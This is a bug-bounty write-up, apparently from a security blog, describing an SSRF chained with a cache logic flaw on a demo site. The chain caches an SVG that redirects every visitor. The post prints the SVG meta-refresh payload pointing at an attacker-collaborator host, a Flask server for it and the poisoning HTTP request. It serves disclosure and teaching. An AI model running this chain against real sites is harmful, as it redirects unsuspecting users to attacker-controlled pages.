---
date: 2025-08-14 10:15:00 AM
---

# SSRF-induced Cache Poisoning Logic Bug Flaw

![alt text](https://thewindghost.github.io/posts/image-post/cache-poisoning-via-fetching-data/1.jpg)

## **TL;DR**
An initial Server-Side Request Forgery (SSRF) vulnerability was underrated (P5) due to a filter that blocked internal resource access. However, when combined with a logic bug in the server's cache mechanism (caching for 1 year after 3 calls), the attacker leveraged **XML Injection** to embed malicious content (an SVG file with a redirecting HTML meta tag) into the cache. This led to a large-scale **Open Redirect** attack, demonstrating how a seemingly harmless vulnerability can become very dangerous when combined with an application's logic flaw.

### **Vulnerability Chain Summary**
- SSRF (Server-Side Request Forgery): Exploiting the Proxy Controller function to force the server to interact with an external service.

- XML Injection: Using an SVG file (an XML format) to inject malicious HTML content into the server's response.

- Variant Cache Poisoning: The attacker makes three requests to the vulnerable server's endpoint, which fetches the malicious SVG file from the attacker's server. The server's logic bug then caches this malicious content for one year.
- Open Redirect Attack: After the content is cached, any subsequent user who accesses the same endpoint is automatically served the cached malicious SVG file, causing their browser to redirect them to the attacker's specified URL.

---
## 1. Server-Side Request Forgery (SSRF) Vulnerability Leading to Variant Cache Poisoning

The Server-Side Request Forgery (SSRF) vulnerability was discovered in the `url` parameter of the [Proxy Controller](https://inappwebview.dev/docs/webview/proxy-controller/) function. The root cause was the application's lack of effective authentication and authorization mechanisms, which allowed any user to utilize this function.

An attacker could exploit this vulnerability by providing an arbitrary domain (`attacker domain`), forcing the server to interact with external services. However, this vulnerability couldn't be exploited to access the server's internal resources (like localhost) because the application had a filter in place.

![alt text](https://thewindghost.github.io/posts/image-post/cache-poisoning-via-fetching-data/0.jpg)

Because it was not possible to call internal server resources (localhost), `Bugcrowd` downgraded the severity of the vulnerability to `P5 (Informational)`, considering it only as an informational finding rather than a serious security risk.

![alt text](https://thewindghost.github.io/posts/image-post/cache-poisoning-via-fetching-data/2.png)

---
## 2. Variant Cache Poisoning Vulnerability

The Variant Cache Poisoning vulnerability was discovered through the server's response. Headers like `X-Cache: Hit from CloudFront` and `Age: 5` along with `Status 200 OK` indicated that the server was using a CDN (Content Delivery Network) and the content was being cached.

Initially, when I tried changing the `Content-Type` in the malicious server's header to `text/html`, the server returned a `Status 400 Bad Request` because it didn't accept this content type.

![alt text](https://thewindghost.github.io/posts/image-post/cache-poisoning-via-fetching-data/4.jpg)

However, when I switched to using `Content-Type: image/svg+xml`, the server responded with `Status 200 OK`. This proved that the server successfully accepted and processed this content type, opening up an exploitation possibility.

As a result, I successfully performed a **Variant Cache Poisoning** attack. This vulnerability is especially dangerous because it allowed me to execute an **XML Injection** attack to embed malicious HTML content into an SVG file. This HTML code was then stored in the cache, setting the stage for subsequent attacks.

![alt text](https://thewindghost.github.io/posts/image-post/cache-poisoning-via-fetching-data/3.jpg)

Upon further investigation, I realized this wasn't a typical `Cache Poisoning` vulnerability. It was a `Logic Bug Flaw`.

Specifically, the server was programmed to only allow requests to an Endpoint a maximum of 3 times. After 3 times, the cache would be stored for 1 year. When another user accesses this Endpoint, the server will always serve the malicious content that was previously cached, instead of processing a new request. This is the weakness in the application's logic, not a simple configuration error, so I will call it **Variant Cache Poisoning** to be more accurate and avoid confusing or misleading some readers who don't read the whole article because it's too long.

Note: I used the tool [requestrepo.com](https://requestrepo.com/) to modify headers during the testing process.
![alt text](https://thewindghost.github.io/posts/image-post/cache-poisoning-via-fetching-data/5.png)

---
## 3. Impact & Attack Scenario

### Impact

Although the `Variant Cache Poisoning` vulnerability allowed the attacker to inject malicious content into the `cache`, direct exploitation to perform `XSS Stored` was blocked by the system's `CSP (Content Security Policy)`. Therefore, I redirected my research to find another more feasible attack scenario.

![alt text](https://thewindghost.github.io/posts/image-post/cache-poisoning-via-fetching-data/8.png)

After analysis, I realized it was possible to leverage the ability to inject HTML content to cause an **Open Redirect** attack by using a `meta tag`.

### Attack Scenario

To demonstrate this scenario, I set up a malicious server to log access attempts.

I created a `poc.xml` file on the malicious server with the following content:

`poc.xml`
```xml
<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<svg xmlns="[http://www.w3.org/2000/svg](http://www.w3.org/2000/svg)" version="1.1">
  <foreignObject width="100%" height="100%">
    <body xmlns="[http://www.w3.org/1999/xhtml](http://www.w3.org/1999/xhtml)">
      <meta http-equiv="refresh" content="0; url=[https://wcc9fwntbs9o7upj4haqmnxi0960uqif.oastify.com/](https://wcc9fwntbs9o7upj4haqmnxi0960uqif.oastify.com/)" />
    </body>
  </foreignObject>
</svg>
```

This file is actually an `SVG (a form of XML)` containing a `<foreignObject>` tag, which allows embedding HTML content. Thanks to the `http://www.w3.org/1999/xhtml` namespace, the `<meta http-equiv="refresh">` tag will be processed by the user's browser, forcing them to automatically redirect to a URL specified by the attacker.

### Exploitation Process:

1. I set up a malicious server using Flask to serve the `poc.xml` file with the `Content-Type: image/svg+xml` header.

```python
from flask import Flask, make_response
import os

app = Flask(__name__)

@app.route('/poc.xml')
def serve_svg_as_xml():
    file_path = os.path.join(os.getcwd(), 'poc.xml')
    if os.path.exists(file_path):
        with open(file_path, 'rb') as f:
            response = make_response(f.read())
            response.headers.set('Content-Type', 'image/svg+xml')
            return response
    else:
        return "File poc.xml not found!", 404

if __name__ == '__main__':
    app.run(debug=False, host='0.0.0.0', port=5505)
```

2. Using Burp Suite Repeater, I exploited the SSRF by supplying the address of my malicious server (`http://{ip}:{port}/poc.xml`) as the `u` parameter.

```http
GET /media?u=http://Ip-Demo:5505/poc.xml HTTP/2
Host: VulnWeb-demo.com
Cookie: None
Sec-Ch-Ua: "Chromium";v="135", "Not-A.Brand";v="8" Sec-Ch-Ua-Mobile: ?0 Sec-Ch-Ua-Platform: "Windows" Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Sec-Fetch-Site: none Sec-Fetch-Mode: navigate Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
```

3. When the vulnerable server (`VulnWeb-demo.com`) made the request, it fetched the entire content of my `poc.xml` and stored it in cache.

![alt text](https://thewindghost.github.io/posts/image-post/cache-poisoning-via-fetching-data/6.jpg)

4. As a result, the server returned the malicious content served from my server.

![alt text](https://thewindghost.github.io/posts/image-post/cache-poisoning-via-fetching-data/7.jpg)

## 4. Flow diagram

### Notes about the vulnerability

This vulnerability can lead to Open Redirect attacks, which may sound low-impact, but the issue is that the payload is cached for 1 year. Consequently, every user who accesses that endpoint will be redirected, resulting in a large-scale attack.

![alt text](https://mermaid.ink/img/pako\:eNp9km9vmzAQxr-KdVPe0SzkH5QXkxKyptpSaWqidBr0hQMXsGpsZsyUNOK7z5i2o9M0v7rz73nuTj5fIJEpQgCDwYUJpgNyiQUhMegcC4whMGGKR1pzHYPTQ3uqGD1wrFqN9bToKIXesucXozsvTy-uV_iALMt1hw-Spz2s8aRDyaXq6IeRPT0BZwL_K8A0ww09IF_S5ClTshamfmCUR3tiaIVNLJpmMIhFpmiZk819e7mI9izZseKRXF19Il-ie_xZY6W7dBmFXNbpjTLzP7bqz9FCa9MCVSf4Gt1RzhIm64q8c4atetmF0RbVL1RkX3OBih4YZ_psy4Vdlz_hKvqm5OlMblAnOVlRTa1uZeFtr1lX0sJbC9c9GJpxUWiy3a8_fr_bWNX677F270avSikqtMqdxQtwIFMshUCrGh0oUBW0TeEf34Sqp_aJG-MpqfghZfFqM6vIcgiOlFcmq8uUalwxajZQvN0qFCmq0CxNQzB1fVsEggucIPDd4dz3pvPpyJt57rU7c-AMwWQ8Hk7nnjsZ-7OJe-15jQPPtuto6Huz5jcMZeBn)

## 5. References:

[https://www.w3.org/TR/SVG11/](https://www.w3.org/TR/SVG11/)

[https://www.w3.org/TR/xhtml1/](https://www.w3.org/TR/xhtml1/)

[https://developer.mozilla.org/en-US/docs/Web/SVG/Tutorial/Getting_Started#serving_svg](https://developer.mozilla.org/en-US/docs/Web/SVG/Tutorial/Getting_Started#serving_svg)

[https://owasp.org/www-community/attacks/Server_Side_Request_Forgery](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery)

## 6. Proof-of-Concept (POC) - Video

![](https://thewindghost.github.io/posts/image-post/cache-poisoning-via-fetching-data/video.gif)

## 7. Conclusion

This case demonstrates that a vulnerability initially classified as low-severity (P5) can become more dangerous when combined with an application logic flaw. It underscores the importance of not only identifying vulnerabilities but also thoroughly analyzing their operational context to accurately assess the true risk.
